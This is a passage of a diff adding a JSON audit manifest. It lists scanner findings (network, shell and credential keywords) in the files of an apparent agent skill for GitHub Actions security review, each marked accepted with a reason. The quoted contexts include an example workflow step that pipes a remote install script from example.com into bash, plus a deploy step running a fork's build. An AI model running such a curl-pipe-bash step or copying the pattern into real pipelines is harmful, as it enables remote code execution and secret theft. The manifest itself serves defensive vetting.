+          "context": "  - run: ./deploy.sh dist/  # Deploying fork's build output!",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 170,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 247,
+          "evidence": "sh",
+          "context": "          ./deploy.sh dist/",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 266,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 267,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Caching dependencies](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 268,
+          "evidence": "https://",
+          "context": "- [Cycode: GitHub Actions Cache Poisoning](https://cycode.com/blog/github-actions-cache-poisoning/)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/supply-chain.md",
+      "sha256": "1f80df872a1be8f70ccf1be0bb25b2e24ee1ec2ac6a9f3d7a53800cb361bfa86",
+      "bytes": 9616,
+      "mode": "100644",
+      "git_blob": "7a9d1a012dcef748de83b5960bce715ffc3758c0",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "filesystem-write",
+          "line": 37,
+          "evidence": "delete",
+          "context": "Tags are **mutable Git references**. The maintainer (or attacker with write access) can delete and recreate a tag pointing to a different commit. When the tag is updated, every workflow using that tag runs the new code.",
+          "disposition": "accepted",
+          "reason": "Redirections such as echo > token.txt or >> $GITHUB_STEP_SUMMARY appear only inside example workflows and attacker payloads; the skill writes no files."
+        },
+        {
+          "type": "network-access",
+          "line": 88,
+          "evidence": "curl",
+          "context": "### Actions That curl | bash at Runtime",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 88,
+          "evidence": "bash",
+          "context": "### Actions That curl | bash at Runtime",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 97,
+          "evidence": "curl",
+          "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 97,
+          "evidence": "https://",
+          "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 97,
+          "evidence": "sh",
+          "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 97,
+          "evidence": "bash",
+          "context": "    - run: curl -sSfL https://example.com/install.sh | bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 98,
+          "evidence": "bash",
+          "context": "      shell: bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 107,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 199,
+          "evidence": "secret",
+          "context": "| Unpinned third-party action from known org in sensitive/privileged workflow | **High** | Tag mutation risk with secret exposure |",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 200,
+          "evidence": "secret",
+          "context": "| Unpinned third-party action with limited privilege but real write/secret surface | **Medium** | Real supply-chain risk, bounded blast radius |",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 210,
+          "evidence": "curl",
+          "context": "ATTACK: Supply Chain via [unpinned third-party action / tag mutation / curl|bash]",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 210,
+          "evidence": "bash",
+          "context": "ATTACK: Supply Chain via [unpinned third-party action / tag mutation / curl|bash]",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 215,
+          "evidence": "secret",
+          "context": "IMPACT: [RCE with workflow permissions, secret theft, etc.]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 222,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Security hardening — Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 223,
+          "evidence": "https://",
+          "context": "- [GitHub Blog: Four tips to keep your GitHub Actions workflows secure](https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "SKILL.md",
+      "sha256": "b75c6c43ff99c82b3cf44519bd30723917de97064f225e392ecfd6fdcd7455bd",
+      "bytes": 8966,
+      "mode": "100644",
+      "git_blob": "7ef6c6ed67a57539e62e6465acf5a8a45fab12d0",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "credential-access",
+          "line": 3,
+          "evidence": "credential",
+          "context": "description: 'GitHub Actions security review for workflow exploitation vulnerabilities. Use when asked to \"review GitHub Actions\", \"audit workflows\", \"check CI security\", \"GHA security\", \"workflow security review\", or review .github/workflo",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 4,
+          "evidence": "Bash",
+          "context": "allowed-tools: Read Grep Glob Bash Task",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 9,
+          "evidence": "https://",
+          "context": "by StepSecurity (2025): https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "credential-access",
+          "line": 75,
+          "evidence": "credential",
+          "context": "| PATs / deploy keys / elevated credentials | `references/credential-escalation.md` |",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 107,
+          "evidence": "Credential",
+          "context": "### Check 4: Credential Escalation",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 110,
+          "evidence": "secret",
+          "context": "- What's the blast radius of each secret?",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        }
+      ]
+    }
+  ]
+}
